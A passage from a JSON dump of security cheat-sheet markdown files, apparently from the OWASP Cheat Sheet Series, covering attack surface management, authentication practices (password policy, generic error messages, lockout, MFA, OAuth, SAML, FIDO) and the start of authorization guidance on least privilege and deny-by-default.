other researchers have developed a method for measuring the Attack Surface of an application, and to track changes to the Attack Surface over time, called the [Relative Attack Surface Quotient (RSQ)](https://www.cs.cmu.edu/~wing/publications/Howard-Wing03.pdf). Using this method you calculate an overall attack surface score for the system, and measure this score as changes are made to the system and to how it is deployed. Researchers at Carnegie Mellon built on this work to develop a formal way to calculate an [Attack Surface Metric](https://mlsec.info/pdf/tse11.pdf) for large systems like SAP. They calculate the Attack Surface as the sum of all entry and exit points, channels (the different ways that clients or external systems connect to the system, including TCP/UDP ports, RPC end points, named pipes...) and untrusted data elements. Then they apply a damage potential/effort ratio to these Attack Surface elements to identify high-risk areas.\r\n\r\nNote that deploying multiple versions of an application, leaving features in that are no longer used just in case they may be needed in the future, or leaving old backup copies and unused code increases the Attack Surface. Source code control and robust change management/configurations practices should be used to ensure the actual deployed Attack Surface matches the theoretical one as closely as possible.\r\n\r\nBackups of code and data - online, and on offline media - are an important but often ignored part of a system's Attack Surface. Protecting your data and IP by writing secure software and hardening the infrastructure will all be wasted if you hand everything over to bad actors by not protecting your backups.\r\n\r\n## Managing the Attack Surface\r\n\r\nOnce you have a baseline understanding of the Attack Surface, you can use it to incrementally identify and manage risks going forward as you make changes to the application. Ask yourself:\r\n\r\n- What has changed?\r\n- What are you doing different? (technology, new approach, ….)\r\n- What holes could you have opened?\r\n\r\nThe first web page that you create opens up the system's Attack Surface significantly and introduces all kinds of new risks. If you add another field to that page, or another web page like it, while technically you have made the Attack Surface bigger, you haven't increased the risk profile of the application in a meaningful way. Each of these incremental changes is more of the same, unless you follow a new design or use a new framework.\r\n\r\nIf you add another web page that follows the same design and using the same technology as existing web pages, it's easy to understand how much security testing and review it needs. If you add a new web services API or file that can be uploaded from the Internet, each of these changes have a different risk profile again - see if the change fits in an existing bucket, see if the existing controls and protections apply. If you're adding something that doesn't fall into an existing bucket, this means that you have to go through a more thorough risk assessment to understand what kind of security holes you may open and what protections you need to put in place.\r\n\r\nChanges to session management, authentication and password management directly affect the Attack Surface and need to be reviewed. So do changes to authorization and access control logic, especially adding or changing role definitions, adding admin users or admin functions with high privileges. Similarly for changes to the code that handles encryption and secrets. Fundamental changes to how data validation is done. And major architectural changes to layering and trust relationships, or fundamental changes in technical architecture – swapping out your web server or database platform, or changing the runtime operating system.\r\n\r\nAs you add new user types or roles or privilege levels, you do the same kind of analysis and risk assessment. Overlay the type of access across the data and functions and look for problems and inconsistencies. It's important to understand the access model for the application, whether it is positive (access is deny by default) or negative (access is allow by default). In a positive access model, any mistakes in defining what data or functions are permitted to a new user type or role are easy to see. In a negative access model, you have to be much more careful to ensure that a user does not get access to data/functions that they should not be permitted to.\r\n\r\nThis kind of threat or risk assessment can be done periodically, or as a part of design work in serial / phased / spiral / waterfall development projects, or continuously and incrementally in Agile / iterative development.\r\n\r\nNormally, an application's Attack Surface will increase over time as you add more interfaces and user types and integrate with other systems. You also want to look for ways to reduce the size of the Attack Surface when you can by simplifying the model (reducing the number of user levels for example or not storing confidential data that you don't absolutely have to), turning off features and interfaces that aren't being used, by introducing operational controls such as a Web Application Firewall (WAF) and real-time application-specific attack detection.\r\n"
    },
    {
      "Authentication_Cheat_Sheet.md": "# Authentication Cheat Sheet\r\n\r\n## Introduction\r\n\r\n**Authentication** is the process of verifying that an individual, entity or website is whom it claims to be. Authentication in the context of web applications is commonly performed by submitting a username or ID and one or more items of private information that only a given user should know.\r\n\r\n**Session Management** is a process by which a server maintains the state of an entity interacting with it. This is required for a server to remember how to react to subsequent requests throughout a transaction. Sessions are maintained on the server by a session identifier which can be passed back and forth between the client and server when transmitting and receiving requests. Sessions should be unique per user and computationally very difficult to predict. The [Session Management Cheat Sheet](Session_Management_Cheat_Sheet.md) contains further guidance on the best practices in this area.\r\n\r\n## Authentication General Guidelines\r\n\r\n### User IDs\r\n\r\nMake sure your usernames/user IDs are case-insensitive. User 'smith' and user 'Smith' should be the same user. Usernames should also be unique. For high-security applications, usernames could be assigned and secret instead of user-defined public data.\r\n\r\n#### Email address as a User ID\r\n\r\nFor information on validating email addresses, please visit the [input validation cheatsheet email discussion](Input_Validation_Cheat_Sheet.md#email-address-validation).\r\n\r\n### Authentication Solution and Sensitive Accounts\r\n\r\n- Do **NOT** allow login with sensitive accounts (i.e. accounts that can be used internally within the solution such as to a back-end / middle-ware / DB) to any front-end user-interface\r\n- Do **NOT** use the same authentication solution (e.g. IDP / AD) used internally for unsecured access (e.g. public access / DMZ)\r\n\r\n### Implement Proper Password Strength Controls\r\n\r\nA key concern when using passwords for authentication is password strength. A \"strong\" password policy makes it difficult or even improbable for one to guess the password through either manual or automated means. The following characteristics define a strong password:\r\n\r\n- Password Length\r\n    - **Minimum** length of the passwords should be **enforced** by the application. Passwords **shorter than 8 characters** are considered to be weak ([NIST SP800-63B](https://pages.nist.gov/800-63-3/sp800-63b.html)).\r\n    - **Maximum** password length should not be set **too low**, as it will prevent users from creating passphrases. A common maximum length is 64 characters due to limitations in certain hashing algorithms, as discussed in the [Password Storage Cheat Sheet](Password_Storage_Cheat_Sheet.md#maximum-password-lengths). It is important to set a maximum password length to prevent [long password Denial of Service attacks](https://www.acunetix.com/vulnerabilities/web/long-password-denial-of-service/).\r\n- Do not silently truncate passwords. The [Password Storage Cheat Sheet](Password_Storage_Cheat_Sheet.md#maximum-password-lengths) provides further guidance on how to handle passwords that are longer than the maximum length.\r\n- Allow usage of **all** characters including unicode and whitespace. There should be no password composition rules limiting the type of characters permitted.\r\n- Ensure credential rotation when a password leak occurs, or at the time of compromise identification.\r\n- Include password strength meter to help users create a more complex password and block common and previously breached passwords\r\n    - [zxcvbn-ts library](https://github.com/zxcvbn-ts/zxcvbn) can be used for this purpose.\r\n    - [Pwned Passwords](https://haveibeenpwned.com/Passwords) is a service where passwords can be checked against previously breached passwords. You can host it yourself or use the [API](https://haveibeenpwned.com/API/v3#PwnedPasswords).\r\n\r\n#### For more detailed information check\r\n\r\n- [ASVS v4.0 Password Security Requirements](https://github.com/OWASP/ASVS/blob/master/4.0/en/0x11-V2-Authentication.md#v21-password-security-requirements)\r\n- [Passwords Evolved: Authentication Guidance for the Modern Era](https://www.troyhunt.com/passwords-evolved-authentication-guidance-for-the-modern-era/)\r\n\r\n### Implement Secure Password Recovery Mechanism\r\n\r\nIt is common for an application to have a mechanism that provides a means for a user to gain access to their account in the event they forget their password. Please see [Forgot Password Cheat Sheet](Forgot_Password_Cheat_Sheet.md) for details on this feature.\r\n\r\n### Store Passwords in a Secure Fashion\r\n\r\nIt is critical for an application to store a password using the right cryptographic technique. Please see [Password Storage Cheat Sheet](Password_Storage_Cheat_Sheet.md) for details on this feature.\r\n\r\n### Compare Password Hashes Using Safe Functions\r\n\r\nWhere possible, the user-supplied password should be compared to the stored password hash using a secure password comparison function provided by the language or framework, such as the [password_verify()](https://www.php.net/manual/en/function.password-verify.php) function in PHP. Where this is not possible, ensure that the comparison function:\r\n\r\n- Has a maximum input length, to protect against denial of service attacks with very long inputs.\r\n- Explicitly sets the type of both variable, to protect against type confusion attacks such as [Magic Hashes](https://www.whitehatsec.com/blog/magic-hashes/) in PHP.\r\n- Returns in constant time, to protect against timing attacks.\r\n\r\n### Change Password Feature\r\n\r\nWhen developing change password feature, ensure to have:\r\n\r\n- User is authenticated with active session.\r\n- Current password verification. This is to ensure that it's the legitimate user who is changing the password. The abuse case is this: a legitimate user is using a public computer to login. This user forgets to logout. Then another person is using this public computer. If we don't verify current password, they may be able to change the password.\r\n\r\n### Transmit Passwords Only Over TLS or Other Strong Transport\r\n\r\nSee: [Transport Layer Protection Cheat Sheet](Transport_Layer_Protection_Cheat_Sheet.md)\r\n\r\nThe login page and all subsequent authenticated pages must be exclusively accessed over TLS or other strong transport. Failure to utilize TLS or other strong transport for the login page allows an attacker to modify the login form action, causing the user's credentials to be posted to an arbitrary location. Failure to utilize TLS or other strong transport for authenticated pages after login enables an attacker to view the unencrypted session ID and compromise the user's authenticated session.\r\n\r\n### Require Re-authentication for Sensitive Features\r\n\r\nIn order to mitigate CSRF and session hijacking, it's important to require the current credentials for an account before updating sensitive account information such as the user's password, user's email, or before sensitive transactions, such as shipping a purchase to a new address. Without this countermeasure, an attacker may be able to execute sensitive transactions through a CSRF or XSS attack without needing to know the user's current credentials. Additionally, an attacker may get temporary physical access to a user's browser or steal their session ID to take over the user's session.\r\n\r\n### Consider Strong Transaction Authentication\r\n\r\nSome applications should use a second factor to check whether a user may perform sensitive operations. For more information, see the [Transaction Authorization Cheat Sheet](Transaction_Authorization_Cheat_Sheet.md).\r\n\r\n#### TLS Client Authentication\r\n\r\nTLS Client Authentication, also known as two-way TLS authentication, consists of both, browser and server, sending their respective TLS certificates during the TLS handshake process. Just as you can validate the authenticity of a server by using the certificate and asking a well known Certificate Authority (CA) if the certificate is valid, the server can authenticate the user by receiving a certificate from the client and validating against a third party CA or its own CA. To do this, the server must provide the user with a certificate generated specifically for him, assigning values to the subject so that these can be used to determine what user the certificate should validate. The user installs the certificate on a browser and now uses it for the website.\r\n\r\nIt is a good idea to do this when:\r\n\r\n- It is acceptable (or even preferred) that the user only has access to the website from only a single computer/browser.\r\n- The user is not easily scared by the process of installing TLS certificates on his browser, or there will be someone, probably from IT support, that will do this for the user.\r\n- The website requires an extra step of security.\r\n- It is also a good thing to use when the website is for an intranet of a company or organization.\r\n\r\nIt is generally not a good idea to use this method for widely and publicly available websites that will have an average user. For example, it wouldn't be a good idea to implement this for a website like Facebook. While this technique can prevent the user from having to type a password (thus protecting against an average keylogger from stealing it), it is still considered a good idea to consider using both a password and TLS client authentication combined.\r\n\r\nAdditionally, if the client is behind an enterprise proxy which performs SSL/TLS decryption, this will break certificate authentication unless the site is allowed on the proxy.\r\n\r\nFor more information, see: [Client-authenticated TLS handshake](https://en.wikipedia.org/wiki/Transport_Layer_Security#Client-authenticated_TLS_handshake)\r\n\r\n### Authentication and Error Messages\r\n\r\nIncorrectly implemented error messages in the case of authentication functionality can be used for the purposes of user ID and password enumeration. An application should respond (both HTTP and HTML) in a generic manner.\r\n\r\n#### Authentication Responses\r\n\r\nUsing any of the authentication mechanisms (login, password reset or password recovery), an application must respond with a generic error message regardless of whether:\r\n\r\n- The user ID or password was incorrect.\r\n- The account does not exist.\r\n- The account is locked or disabled.\r\n\r\nThe account registration feature should also be taken into consideration, and the same approach of generic error message can be applied regarding the case in which the user exists.\r\n\r\nThe objective is to prevent the creation of a [discrepancy factor](https://cwe.mitre.org/data/definitions/204.html), allowing an attacker to mount a user enumeration action against the application.\r\n\r\nIt is interesting to note that the business logic itself can bring a discrepancy factor related to the processing time taken. Indeed, depending on the implementation, the processing time can be significantly different according to the case (success vs failure) allowing an attacker to mount a [time-based attack](https://en.wikipedia.org/wiki/Timing_attack) (delta of some seconds for example).\r\n\r\nExample using pseudo-code for a login feature:\r\n\r\n- First implementation using the \"quick exit\" approach\r\n\r\n```text\r\nIF USER_EXISTS(username) THEN\r\n    password_hash=HASH(password)\r\n    IS_VALID=LOOKUP_CREDENTIALS_IN_STORE(username, password_hash)\r\n    IF NOT IS_VALID THEN\r\n        RETURN Error(\"Invalid Username or Password!\")\r\n    ENDIF\r\nELSE\r\n   RETURN Error(\"Invalid Username or Password!\")\r\nENDIF\r\n```\r\n\r\nIt can be clearly seen that if the user doesn't exist, the application will directly throw an error. Otherwise, when the user exists and the password doesn't, it is apparent that there will be more processing before the application errors out. In return, the response time will be different for the same error, allowing the attacker to differentiate between a wrong username and a wrong password.\r\n\r\n- Second implementation without relying on the \"quick exit\" approach:\r\n\r\n```text\r\npassword_hash=HASH(password)\r\nIS_VALID=LOOKUP_CREDENTIALS_IN_STORE(username, password_hash)\r\nIF NOT IS_VALID THEN\r\n   RETURN Error(\"Invalid Username or Password!\")\r\nENDIF\r\n```\r\n\r\nThis code will go through the same process no matter what the user or the password is, allowing the application to return in approximately the same response time.\r\n\r\nThe problem with returning a generic error message for the user is a User Experience (UX) matter. A legitimate user might feel confused with the generic messages, thus making it hard for them to use the application, and might after several retries, leave the application because of its complexity. The decision to return a *generic error message* can be determined based on the criticality of the application and its data. For example, for critical applications, the team can decide that under the failure scenario, a user will always be redirected to the support page and a *generic error message* will be returned.\r\n\r\nRegarding the user enumeration itself, protection against [brute-force attack](#protect-against-automated-attacks) is also effective because they prevent an attacker from applying the enumeration at scale. Usage of [CAPTCHA](https://en.wikipedia.org/wiki/CAPTCHA) can be applied on a feature for which a *generic error message* cannot be returned because the *user experience* must be preserved.\r\n\r\n##### Incorrect and correct response examples\r\n\r\n###### Login\r\n\r\nIncorrect response examples:\r\n\r\n- \"Login for User foo: invalid password.\"\r\n- \"Login failed, invalid user ID.\"\r\n- \"Login failed; account disabled.\"\r\n- \"Login failed; this user is not active.\"\r\n\r\nCorrect response example:\r\n\r\n- \"Login failed; Invalid user ID or password.\"\r\n\r\n###### Password recovery\r\n\r\nIncorrect response examples:\r\n\r\n- \"We just sent you a password reset link.\"\r\n- \"This email address doesn't exist in our database.\"\r\n\r\nCorrect response example:\r\n\r\n- \"If that email address is in our database, we will send you an email to reset your password.\"\r\n\r\n###### Account creation\r\n\r\nIncorrect response examples:\r\n\r\n- \"This user ID is already in use.\"\r\n- \"Welcome! You have signed up successfully.\"\r\n\r\nCorrect response example:\r\n\r\n- \"A link to activate your account has been emailed to the address provided.\"\r\n\r\n##### Error Codes and URLs\r\n\r\nThe application may return a different [HTTP Error code](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status) depending on the authentication attempt response. It may respond with a 200 for a positive result and a 403 for a negative result. Even though a generic error page is shown to a user, the HTTP response code may differ which can leak information about whether the account is valid or not.\r\n\r\nError disclosure can also be used as a discrepancy factor, consult the [error handling cheat sheet](Error_Handling_Cheat_Sheet.md) regarding the global handling of different errors in an application.\r\n\r\n### Protect Against Automated Attacks\r\n\r\nThere are a number of different types of automated attacks that attackers can use to try and compromise user accounts. The most common types are listed below:\r\n\r\n| Attack Type | Description |\r\n|-------------|-------------|\r\n| Brute Force | Testing multiple passwords from a dictionary or other source against a single account. |\r\n| Credential Stuffing | Testing username/password pairs obtained from the breach of another site. |\r\n| Password Spraying | Testing a single weak password against a large number of different accounts.|\r\n\r\nDifferent protection mechanisms can be implemented to protect against these attacks. In many cases, these defences do not provide complete protection, but when a number of them are implemented in a defence-in-depth approach, a reasonable level of protection can be achieved.\r\n\r\nThe following sections will focus primarily on preventing brute-force attacks, although these controls can also be effective against other types of attacks. For further guidance on defending against credential stuffing and password spraying, see the [Credential Stuffing Cheat Sheet](Credential_Stuffing_Prevention_Cheat_Sheet.md).\r\n\r\n#### Multi-Factor Authentication\r\n\r\nMulti-factor authentication (MFA) is by far the best defence against the majority of password-related attacks, including brute-force attacks, with analysis by Microsoft suggesting that it would have stopped [99.9% of account compromises](https://techcommunity.microsoft.com/t5/Azure-Active-Directory-Identity/Your-Pa-word-doesn-t-matter/ba-p/731984). As such, it should be implemented wherever possible; however, depending on the audience of the application, it may not be practical or feasible to enforce the use of MFA.\r\n\r\nThe [Multifactor Authentication Cheat Sheet](Multifactor_Authentication_Cheat_Sheet.md) contains further guidance on implementing MFA.\r\n\r\n#### Login Throttling\r\n\r\nLogin Throttling is a protocol used to prevent an attacker from making too many attempts at guessing a password through normal interactive means, it includes:\r\n\r\n- Maximum number of attempts.\r\n\r\n##### Account Lockout\r\n\r\nThe most common protection against these attacks is to implement account lockout, which prevents any more login attempts for a period after a certain number of failed logins.\r\n\r\nThe counter of failed logins should be associated with the account itself, rather than the source IP address, in order to prevent an attacker from making login attempts from a large number of different IP addresses. There are a number of different factors that should be considered when implementing an account lockout policy in order to find a balance between security and usability:\r\n\r\n- The number of failed attempts before the account is locked out (lockout threshold).\r\n- The time period that these attempts must occur within (observation window).\r\n- How long the account is locked out for (lockout duration).\r\n\r\nRather than implementing a fixed lockout duration (e.g., ten minutes), some applications use an exponential lockout, where the lockout duration starts as a very short period (e.g., one second), but doubles after each failed login attempt.\r\n\r\n- Amount of time to delay after each account lockout (max 2-3, after that permanent account lockout).\r\n\r\nWhen designing an account lockout system, care must be taken to prevent it from being used to cause a denial of service by locking out other users' accounts. One way this could be performed is to allow the user of the forgotten password functionality to log in, even if the account is locked out.\r\n\r\n#### CAPTCHA\r\n\r\nThe use of an effective CAPTCHA can help to prevent automated login attempts against accounts. However, many CAPTCHA implementations have weaknesses that allow them to be solved using automated techniques or can be outsourced to services which can solve them. As such, the use of CAPTCHA should be viewed as a defence-in-depth control to make brute-force attacks more time consuming and expensive, rather than as a preventative.\r\n\r\nIt may be more user-friendly to only require a CAPTCHA be solved after a small number of failed login attempts, rather than requiring it from the very first login.\r\n\r\n#### Security Questions and Memorable Words\r\n\r\nThe addition of a security question or memorable word can also help protect against automated attacks, especially when the user is asked to enter a number of randomly chosen characters from the word. It should be noted that this does **not** constitute multi-factor authentication, as both factors are the same (something you know). Furthermore, security questions are often weak and have predictable answers, so they must be carefully chosen. The [Choosing and Using Security Questions cheat sheet](Choosing_and_Using_Security_Questions_Cheat_Sheet.md) contains further guidance on this.\r\n\r\n## Logging and Monitoring\r\n\r\nEnable logging and monitoring of authentication functions to detect attacks/failures on a real-time basis\r\n\r\n- Ensure that all failures are logged and reviewed\r\n- Ensure that all password failures are logged and reviewed\r\n- Ensure that all account lockouts are logged and reviewed\r\n\r\n## Use of authentication protocols that require no password\r\n\r\nWhile authentication through a user/password combination and using multi-factor authentication is considered generally secure, there are use cases where it isn't considered the best option or even safe. Examples of this are third party applications that desire connecting to the web application, either from a mobile device, another website, desktop or other situations. When this happens, it is NOT considered safe to allow the third-party application to store the user/password combo, since then it extends the attack surface into their hands, where it isn't in your control. For this, and other use cases, there are several authentication protocols that can protect you from exposing your users' data to attackers.\r\n\r\n### OAuth\r\n\r\nOpen Authorization (OAuth) is a protocol that allows an application to authenticate against a server as a user, without requiring passwords or any third party server that acts as an identity provider. It uses a token generated by the server and provides how the authorization flows most occur, so that a client, such as a mobile application, can tell the server what user is using the service.\r\n\r\nThe recommendation is to use and implement OAuth 1.0a or OAuth 2.0 since the very first version (OAuth1.0) has been found to be vulnerable to session fixation.\r\n\r\nOAuth 2.0 relies on HTTPS for security and is currently used and implemented by APIs from companies such as Facebook, Google, Twitter and Microsoft. OAuth1.0a is more difficult to use because it requires the use of cryptographic libraries for digital signatures. However, since OAuth1.0a does not rely on HTTPS for security, it can be more suited for higher-risk transactions.\r\n\r\n### OpenId\r\n\r\nOpenId is an HTTP-based protocol that uses identity providers to validate that a user is who they say they are. It is a very simple protocol which allows a service provider initiated way for single sign-on (SSO). This allows the user to re-use a single identity given to a trusted OpenId identity provider and be the same user in multiple websites, without the need to provide any website with the password, except for the OpenId identity provider.\r\n\r\nDue to its simplicity and that it provides protection of passwords, OpenId has been well adopted. Some of the well-known identity providers for OpenId are Stack Exchange, Google, Facebook and Yahoo!\r\n\r\nFor non-enterprise environments, OpenId is considered a secure and often better choice, as long as the identity provider is of trust.\r\n\r\n### SAML\r\n\r\nSecurity Assertion Markup Language (SAML) is often considered to compete with OpenId. The most recommended version is 2.0 since it is very feature-complete and provides strong security. Like OpenId, SAML uses identity providers, but unlike OpenId, it is XML-based and provides more flexibility. SAML is based on browser redirects which send XML data. Furthermore, SAML isn't only initiated by a service provider; it can also be initiated from the identity provider. This allows the user to navigate through different portals while still being authenticated without having to do anything, making the process transparent.\r\n\r\nWhile OpenId has taken most of the consumer market, SAML is often the choice for enterprise applications. The reason for this is often that there are few OpenId identity providers which are considered of enterprise-class (meaning that the way they validate the user identity doesn't have high standards required for enterprise identity). It is more common to see SAML being used inside of intranet websites, sometimes even using a server from the intranet as the identity provider.\r\n\r\nIn the past few years, applications like SAP ERP and SharePoint (SharePoint by using Active Directory Federation Services 2.0) have decided to use SAML 2.0 authentication as an often preferred method for single sign-on implementations whenever enterprise federation is required for web services and web applications.\r\n\r\n**See also: [SAML Security Cheat Sheet](SAML_Security_Cheat_Sheet.md)**\r\n\r\n### FIDO\r\n\r\nThe Fast Identity Online (FIDO) Alliance has created two protocols to facilitate online authentication: the Universal Authentication Framework (UAF) protocol and the Universal Second Factor (U2F) protocol. While UAF focuses on passwordless authentication, U2F allows the addition of a second factor to existing password-based authentication. Both protocols are based on a public key cryptography challenge-response model.\r\n\r\nUAF takes advantage of existing security technologies present on devices for authentication including fingerprint sensors, cameras(face biometrics), microphones(voice biometrics), Trusted Execution Environments(TEEs), Secure Elements(SEs) and others. The protocol is designed to plug-in these device capabilities into a common authentication framework. UAF works with both native applications and web applications.\r\n\r\nU2F augments password-based authentication using a hardware token (typically USB) that stores cryptographic authentication keys and uses them for signing. The user can use the same token as a second factor for multiple applications. U2F works with web applications. It provides **protection against phishing** by using the URL of the website to look up the stored authentication key.\r\n\r\n## Password Managers\r\n\r\nPassword managers are programs, browser plugins or web services that automate management of large number of different credentials. Most password managers have functionality to allow users to easily use them on websites, either by pasting the passwords into the login form, or by simulating the user typing them in.\r\n\r\nWeb applications should not make password managers' job more difficult than necessary by observing the following recommendations:\r\n\r\n- Use standard HTML forms for username and password input with appropriate `type` attributes.\r\n    - Avoid plugin-based login pages (such as Flash or Silverlight).\r\n- Implement a reasonable maximum password length, such as 64 characters, as discussed in the [Password Storage Cheat Sheet](Password_Storage_Cheat_Sheet.md#maximum-password-lengths).\r\n- Allow any printable characters to be used in passwords.\r\n- Allow users to paste into the username and password fields.\r\n- Allow users to navigate between the username and password field with a single press of the `Tab` key.\r\n\r\n## Changing A User's Registered Email Address\r\n\r\nUser email addresses often change. The following process is recommended to handle such situations in a system:\r\n\r\n*Note: The process is less stringent with [Multifactor Authentication](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html), as proof-of-identity is stronger than relying solely on a password.*\r\n\r\n### Recommended Process If the User HAS [Multifactor Authentication](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html) Enabled\r\n\r\n1. Confirm the validity of the user's authentication cookie/token. If not valid, display a login screen.\r\n2. Describe the process for changing the registered email address to the user.\r\n3. Ask the user to submit a proposed new email address, ensuring it complies with system rules.\r\n4. Request the use of [Multifactor Authentication](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html) for identity verification.\r\n5. Store the proposed new email address as a pending change.\r\n6. Create and store **two** time-limited nonces for (a) system administrators' notification, and (b) user confirmation.\r\n7. Send two email messages with links with those nonces:\r\n   - A **notification-only email message** to the current address, alerting the user to the impending change and providing a link for an unexpected situation.\r\n   - A **confirmation-required email message** to the proposed new address, instructing the user to confirm the change and providing a link for an unexpected situations.\r\n8. Handle responses from the links accordingly.\r\n\r\n### Recommended Process If the User DOES NOT HAVE Multifactor Authentication Enabled\r\n\r\n1. Confirm the validity of the user's authentication cookie/token. If not valid, display a login screen.\r\n2. Describe the process for changing the registered email address to the user.\r\n3. Ask the user to submit a proposed new email address, ensuring it complies with system rules.\r\n4. Request the user's current password for identity verification.\r\n5. Store the proposed new email address as a pending change.\r\n6. Create and store three time-limited nonces for system administrators' notification, user confirmation, and an additional step for password reliance.\r\n7. Send two email messages with links to those nonces:\r\n   - A **confirmation-required email message** to the current address, instructing the user to confirm the change and providing a link for an unexpected situation.\r\n   - A **separate confirmation-required email message** to the proposed new address, instructing the user to confirm the change and providing a link for an unexpected situation.\r\n8. Handle responses from the links accordingly.\r\n\r\n## Notes on the Above Processes\r\n\r\n- It's worth noting that Google adopts a different approach with accounts secured only by a password -- [where the current email address receives a notification-only email](https://support.google.com/accounts/answer/55393?hl=en). This method carries risks and requires user vigilance.\r\n\r\n- Regular social engineering training is crucial. System administrators and help desk staff should be trained to follow the prescribed process and recognize and respond to social engineering attacks. Refer to [CISA's \"Avoiding Social Engineering and Phishing Attacks\"](https://www.cisa.gov/news-events/news/avoiding-social-engineering-and-phishing-attacks) for guidance.\r\n"
    },
    {
      "Authorization_Cheat_Sheet.md": "# Authorization Cheat Sheet\r\n\r\n## Introduction\r\n\r\nAuthorization may be defined as \"the process of verifying that a requested action or service is approved for a specific entity\" ([NIST](https://csrc.nist.gov/glossary/term/authorization)). Authorization is distinct from authentication which is the process of verifying an entity's identity. When designing and developing a software solution, it is important to keep these distinctions in mind. A user who has been authenticated (perhaps by providing a username and password) is often not authorized to access every resource and perform every action that is technically possible through a system. For example, a web app may have both regular users and admins, with the admins being able to perform actions the average user is not privileged to do so, even though they have been authenticated. Additionally, authentication is not always required for accessing resources; an unauthenticated user may be authorized to access certain public resources, such as an image or login page, or even an entire web app.\r\n\r\nThe objective of this cheat sheet is to assist developers in implementing authorization logic that is robust, appropriate to the app's business context, maintainable, and scalable. The guidance provided in this cheat sheet should be applicable to all phases of the development lifecycle and flexible enough to meet the needs of diverse development environments.\r\n\r\nFlaws related to authorization logic are a notable concern for web apps. Broken Access Control was ranked as the most concerning web security vulnerability in [OWASP's 2021 Top 10](https://owasp.org/Top10/A01_2021-Broken_Access_Control/) and asserted to have a \"High\" likelihood of exploit by [MITRE's CWE program](https://cwe.mitre.org/data/definitions/285.html). Furthermore, according to [Veracode's State of Software Vol. 10](https://www.veracode.com/sites/default/files/pdf/resources/sossreports/state-of-software-security-volume-10-veracode-report.pdf), Access Control was among the more common of OWASP's Top 10 risks to be involved in exploits and security incidents despite being among the least prevalent of those examined.\r\n\r\nThe potential impact resulting from exploitation of authorization flaws is highly variable, both in form and severity. Attackers may be able read, create, modify, or delete resources that were meant to be protected (thus jeopardizing their confidentiality, integrity, and/or availability); however, the actual impact of such actions is necessarily linked to the criticality and sensitivity of the compromised resources. Thus, the business cost of a successfully exploited authorization flaw can range from very low to extremely high.\r\n\r\nBoth entirely unauthenticated outsiders and authenticated (but not necessarily authorized) users can take advantage of authorization weaknesses.  Although honest mistakes or carelessness on the part of non-malicious entities may enable authorization bypasses, malicious intent is typically required for access control threats to be fully realized.  Horizontal privilege elevation (i.e. being able to access another user's resources) is an especially common weakness that an authenticated user may be able to take advantage of. Faults related to authorization control can allow malicious insiders and outsiders alike to view, modify, or delete sensitive resources of all forms (databases records, static files, personally identifiable information (PII), etc.) or perform actions, such as creating a new account or initiating a costly order, that they should not be privileged to do. Furthermore, if logging related to access control is not properly set-up, such authorization violations may go undetected or a least remain unattributable to a particular individual or group.\r\n\r\n## Recommendations\r\n\r\n### Enforce Least Privileges\r\n\r\nAs a security concept, Least Privileges refers to the principle of assigning users only the minimum privileges necessary to complete their job. Although perhaps most commonly applied in system administration, this principle has relevance to the software developer as well. Least Privileges must be applied both horizontally and vertically. For example, even though both an accountant and sales representative may occupy the same level in an organization's hierarchy, both require access to different resources to perform their jobs. The accountant should likely not be granted access to a customer database and the sales representative should not be able to access payroll data. Similarly, the head of the sales department is likely to need more privileged access than their subordinates.\r\n\r\nFailure to enforce least privileges in an application can jeopardize the confidentiality of sensitive resources. Mitigation strategies are applied primarily during the Architecture and Design phase (see [CWE-272](https://cwe.mitre.org/data/definitions/272.html)); however, the principle must be addressed throughout the SDLC.\r\n\r\nConsider the following points and best practices:\r\n\r\n- During the design phase, ensure trust boundaries are defined. Enumerate the types of users that will be accessing the system, the resources exposed and the operations (such as read, write, update, etc) that might be performed on those resources. For every combination of user type and resource, determine what operations, if any, the user (based on role and/or other attributes) must be able to perform on that resource. For an ABAC system ensure all categories of attributes are considered. For example, a Sales Representative may need to access a customer database from the internal network during working hours, but not from home at midnight.\r\n- Create tests that validate that the permissions mapped out in the design phase are being correctly enforced.\r\n- After the app has been deployed, periodically review permissions in the system for \"privilege creep\"; that is, ensure the privileges of users in the current environment do not exceed those defined during the design phase (plus or minus any formally approved changes).\r\n- Remember, it is easier to grant users additional permissions rather than to take away some they previously enjoyed. Careful planning and implementation of Least Privileges early in the SDLC can help reduce the risk of needing to revoke permissions that are later deemed overly broad.\r\n\r\n### Deny by Default\r\n\r\nEven when no access control rules are explicitly matched, the application cannot remain neutral when an entity is requesting access to a particular resource. The application must always make a decision, whether implicitly or explicitly, to either deny or permit the requested access. Logic errors and other mistakes relating to access control may happen, especially when access requirements are complex; consequently, one should not rely entirely on explicitly defined rules for matching all possible requests. For security purposes an application should be configured to deny access by default.\r\n\r\nConsider the following points and best practices:\r\n\r\n- Adopt a \"deny-by-default\" mentality both during initial development and whenever new functionality or resources are exposed by the app. One should be able to explicitly justify why a specific permission was granted to a particular user or group rather than assuming access to be the default position.\r\n- Although some frameworks or libraries may themselves adopt a deny-by-default strategy, explicit configuration should be preferred over relying on framework or library defaults. The logic and defaults of third-party code may evolve over time, without the developer's full knowledge or understanding of the change's implications for a particular project.\r\n  \r\n### Validate the Permissions on Every Request\r\n\r\nPermission should be validated correctly on every request, regardless of whether the request was initiated by an AJAX script, server-side, or any other source. The technology used to perform such checks should allow for global, application-wide configuration rather than needing to be applied individually to every method or class. Remember an attacker only needs to find one way in. Even if just a single access control check is \"missed\", the confidentiality and/or integrity of a resource can be jeopardized. Validating permissions correctly on just the majority of requests is insufficient. Specific technologies that can help developers in performing such consistent permission checks include the following:\r\n\r\n- [Java/Jakarta EE Filters](https://jakarta.ee/specifications/platform/8/apidocs/javax/servlet/Filter.html) including implementations in [Spring Security](https://docs.spring.io/spring-security/site/docs/5.4.0/reference/html5/#servlet-security-filters)\r\n- [Middleware in the Django Framework](https://docs.djangoproject.com/en/4.0/ref/middleware/)\r\n- [.NET Core Filters](https://docs.microsoft.com/en-us/aspnet/core/mvc/controllers/filters?view=aspnetcore-3.1#authorization-filters)\r\n- [Middleware in the Laravel PHP Framework](https://laravel.com/docs/8.x/middleware)\r\n\r\n### Thoroughly Review the Authorization Logic of Chosen Tools and Technologies, Implementing Custom Logic if Necessary\r\n\r\nToday's developers have access to vast amount of libraries, platforms, and frameworks that allow them to incorporate robust, complex logic into their apps with minimal effort. However, these frameworks and libraries must not be viewed as a quick panacea for all development 